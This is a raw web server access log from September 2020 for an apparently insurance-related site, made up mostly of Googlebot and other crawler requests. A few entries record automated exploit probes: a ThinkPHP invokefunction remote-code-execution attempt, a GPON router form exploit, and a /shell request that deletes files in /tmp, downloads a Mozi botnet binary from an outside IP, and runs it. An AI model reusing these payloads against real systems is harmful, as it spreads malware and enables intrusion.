::ffff:127.0.0.1 - - [16/Sep/2020:00:00:47 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:03:25:42 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:03:25:42 +0000] "GET / HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.110 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:03:44:08 +0000] "GET / HTTP/1.1" 200 62517 "-" "Mozilla/5.0"
::ffff:127.0.0.1 - - [16/Sep/2020:04:34:05 +0000] "GET / HTTP/1.1" 200 62517 "-" "-"
::ffff:127.0.0.1 - - [16/Sep/2020:04:44:14 +0000] "GET /ok.css HTTP/1.1" 404 145 "-" "-"
::ffff:127.0.0.1 - - [16/Sep/2020:04:45:44 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://113.116.219.105:54625/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 144 "-" "Hello, world"
::ffff:127.0.0.1 - - [16/Sep/2020:05:37:24 +0000] "GET / HTTP/1.1" 200 62517 "-" "Linux Gnu (cow)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:51:46 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:51:47 +0000] "GET /blog-details/7 HTTP/1.1" 200 34669 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:57:08 +0000] "GET / HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:09 +0000] "GET /referal HTTP/1.1" 200 38043 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:13 +0000] "GET /about-defy HTTP/1.1" 200 41416 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:17 +0000] "GET /carrier-info HTTP/1.1" 200 223630 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:20 +0000] "GET /blogs HTTP/1.1" 200 46723 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:24 +0000] "GET /get_auto_nsurance HTTP/1.1" 200 49181 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:28 +0000] "GET /get_renter_nsurance HTTP/1.1" 200 46586 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:35 +0000] "GET /videos HTTP/1.1" 200 36476 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:44 +0000] "GET /contact HTTP/1.1" 200 39599 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:49 +0000] "GET /get_home_nsurance HTTP/1.1" 200 48331 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:54 +0000] "GET /get_business_nsurance HTTP/1.1" 200 46633 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:55 +0000] "GET /public/front_end/assets/css/slick-theme.css HTTP/1.1" 200 3294 "http://swiftbullhead.com/accident-forgiveness" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:55 +0000] "GET /public/front_end/assets/css/slick.css HTTP/1.1" 200 1776 "http://swiftbullhead.com/accident-forgiveness" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:56 +0000] "GET /public/front_end/assets/css/bootstrap.min.css HTTP/1.1" 200 144877 "http://swiftbullhead.com/accident-forgiveness" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:56 +0000] "GET /public/front_end/assets/js/slick.min.js HTTP/1.1" 200 42863 "http://swiftbullhead.com/accident-forgiveness" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:57 +0000] "GET /public/front_end/assets/css/responsive.css HTTP/1.1" 200 7186 "http://swiftbullhead.com/accident-forgiveness" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:57 +0000] "GET /public/front_end/assets/js/custom.js HTTP/1.1" 200 5717 "http://swiftbullhead.com/accident-forgiveness" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:57 +0000] "GET /public/front_end/assets/css/material-form.css HTTP/1.1" 200 2264 "http://swiftbullhead.com/accident-forgiveness" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:58:59 +0000] "GET /public/front_end/assets/css/custom-2.css HTTP/1.1" 200 43190 "http://swiftbullhead.com/accident-forgiveness" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:00 +0000] "GET /get_life_nsurance HTTP/1.1" 200 46591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:01 +0000] "GET /public/front_end/assets/fonts/fonts.css HTTP/1.1" 200 1444 "http://swiftbullhead.com/accident-forgiveness" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:01 +0000] "GET /public/front_end/assets/js/material-form.js HTTP/1.1" 200 631 "http://swiftbullhead.com/accident-forgiveness" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:02 +0000] "GET /public/front_end/assets/js/jquery-1.9.1.min.js HTTP/1.1" 200 92629 "http://swiftbullhead.com/accident-forgiveness" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:02 +0000] "GET /public/front_end/assets/js/bootstrap.min.js HTTP/1.1" 200 48944 "http://swiftbullhead.com/accident-forgiveness" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:05 +0000] "GET /insurance_more_product HTTP/1.1" 200 35409 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:30 +0000] "GET /get_worker_comp_nsurance HTTP/1.1" 200 45765 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:35 +0000] "GET /get_travel_nsurance HTTP/1.1" 200 46589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:40 +0000] "GET /policy-review-request.htm HTTP/1.1" 404 164 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:48 +0000] "GET /public/front_end/assets/css/custom-2.css HTTP/1.1" 200 43190 "http://swiftbullhead.com/collision-coverage" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:48 +0000] "GET /public/front_end/assets/js/bootstrap.min.js HTTP/1.1" 200 48944 "http://swiftbullhead.com/collision-coverage" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:49 +0000] "GET /public/front_end/assets/fonts/fonts.css HTTP/1.1" 200 1444 "http://swiftbullhead.com/collision-coverage" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:49 +0000] "GET /public/front_end/assets/css/bootstrap.min.css HTTP/1.1" 200 144877 "http://swiftbullhead.com/collision-coverage" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:50 +0000] "GET /public/front_end/assets/css/material-form.css HTTP/1.1" 200 2264 "http://swiftbullhead.com/collision-coverage" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:50 +0000] "GET /public/front_end/assets/js/material-form.js HTTP/1.1" 200 631 "http://swiftbullhead.com/collision-coverage" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:05:59:56 +0000] "GET /resource/2 HTTP/1.1" 200 29877 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:00:01 +0000] "GET /resource/5 HTTP/1.1" 200 33972 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:00:06 +0000] "GET /resource/1 HTTP/1.1" 200 34152 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:00:11 +0000] "GET /insurance/8 HTTP/1.1" 200 42395 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:00:16 +0000] "GET /resource/4 HTTP/1.1" 200 33794 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:00:21 +0000] "GET /insurance/6 HTTP/1.1" 200 41929 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:00:26 +0000] "GET /insurance/7 HTTP/1.1" 200 49555 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:00:31 +0000] "GET /blog-details/25 HTTP/1.1" 200 32470 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:00:36 +0000] "GET /blog-details/21 HTTP/1.1" 200 33486 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:00:40 +0000] "GET /blog-details/26 HTTP/1.1" 200 32951 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:00:45 +0000] "GET /blog-details/23 HTTP/1.1" 200 33516 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:00:50 +0000] "GET /video-about.html HTTP/1.1" 404 155 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:01:00 +0000] "GET /blog-details/24 HTTP/1.1" 200 32379 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:01:10 +0000] "GET /blog-details/5 HTTP/1.1" 200 34182 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:01:15 +0000] "GET /blog-details/9 HTTP/1.1" 200 36521 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:01:20 +0000] "GET /blog-details/7 HTTP/1.1" 200 34669 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:01:24 +0000] "GET /blog-details/17 HTTP/1.1" 200 32134 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:01:29 +0000] "GET /resource/policy-review-request.htm HTTP/1.1" 302 46 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:01:29 +0000] "GET / HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:01:34 +0000] "GET /blog-details/1 HTTP/1.1" 200 35621 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:01:38 +0000] "GET /blog-details/8 HTTP/1.1" 200 39454 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:01:43 +0000] "GET /blog-details/2 HTTP/1.1" 200 34088 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:01:47 +0000] "GET /blog-details/3 HTTP/1.1" 200 31042 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:01:52 +0000] "GET /blog-details/13 HTTP/1.1" 200 34792 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:01:57 +0000] "GET /blog-details/14 HTTP/1.1" 200 33803 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:02:01 +0000] "GET /blog-details/15 HTTP/1.1" 200 34784 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:02:06 +0000] "GET /blog-details/12 HTTP/1.1" 200 34865 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:02:11 +0000] "GET /blog-details/20 HTTP/1.1" 200 33988 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:02:15 +0000] "GET /blog-details/19 HTTP/1.1" 200 34426 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:02:20 +0000] "GET /blog-details/11 HTTP/1.1" 200 35539 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:02:25 +0000] "GET /blog-details/16 HTTP/1.1" 200 36301 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:02:30 +0000] "GET /blog-details/18 HTTP/1.1" 200 34361 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:05:15 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 158 "-" "Hello, World"
::ffff:127.0.0.1 - - [16/Sep/2020:06:05:34 +0000] "GET /resource/3 HTTP/1.1" 200 30976 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:05:35 +0000] "GET /blog-details/22 HTTP/1.1" 200 33196 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:06:36 +0000] "GET /insurance/9 HTTP/1.1" 200 30900 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:07:34 +0000] "GET /blog-details/policy-review-request.htm HTTP/1.1" - - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:08:18 +0000] "GET /insurance/16 HTTP/1.1" 200 38438 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:11:42 +0000] "GET /insurance/14 HTTP/1.1" 200 49439 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:11:42 +0000] "GET /insurance/13 HTTP/1.1" 200 49439 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:13:42 +0000] "GET /blog-details/policy-review-request.htm HTTP/1.1" - - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:14:33 +0000] "GET /insurance/11 HTTP/1.1" 200 49439 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:17:47 +0000] "GET /insurance/3 HTTP/1.1" 200 185062 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:19:32 +0000] "GET /insurance/workers-compensation-insurance.html HTTP/1.1" 302 52 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:19:32 +0000] "GET /insurance/home HTTP/1.1" 302 52 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:19:32 +0000] "GET /insurance/workers-compensation-insurance.html HTTP/1.1" 302 52 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:19:33 +0000] "GET /insurance/home HTTP/1.1" 302 52 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:19:33 +0000] "GET /insurance/home HTTP/1.1" 302 52 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:19:47 +0000] "GET /blog-details/policy-review-request.htm HTTP/1.1" - - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:20:47 +0000] "GET /web_assets/assets/icons/web/square.svg HTTP/1.1" 200 652 "http://swiftbullhead.com/insurance/3" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:06:20:47 +0000] "GET /web_assets/assets/js/autocomplete.js HTTP/1.1" 200 4501 "http://swiftbullhead.com/insurance/3" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:06:21:57 +0000] "GET /web_assets/assets/img/svg/radio.svg HTTP/1.1" 200 480 "http://swiftbullhead.com/web_assets/assets/css/custom-2.css" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.105 Safari/537.36"
::ffff:127.0.0.1 - - [16/Sep/2020:06:23:01 +0000] "GET /insurance/workers-compensation-insurance.html HTTP/1.1" 302 52 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.110 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:29:28 +0000] "GET /insurance/home HTTP/1.1" 302 52 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.110 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:31:26 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:127.0.0.1 - - [16/Sep/2020:06:35:43 +0000] "HEAD /robots.txt HTTP/1.1" 404 150 "-" "-"
::ffff:127.0.0.1 - - [16/Sep/2020:06:35:43 +0000] "GET /insurance/workers-compensation-insurance.html HTTP/1.1" 302 52 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.110 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
